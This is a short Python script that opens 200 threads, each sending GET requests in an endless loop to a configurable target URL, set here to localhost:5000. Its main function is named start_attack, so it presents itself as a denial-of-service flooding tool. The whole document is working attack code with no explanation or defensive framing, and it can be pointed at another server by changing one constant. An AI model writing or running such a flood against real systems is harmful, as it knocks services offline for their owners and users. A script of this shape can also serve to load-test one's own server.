import threading
import requests


TARGET_URL = 'http://localhost:5000'

NUM_THREADS = 200

def send_request():
    try:
        while True:
            response = requests.get(TARGET_URL)
            print(f"Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request failed: {e}")

def start_attack():
    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    start_attack()
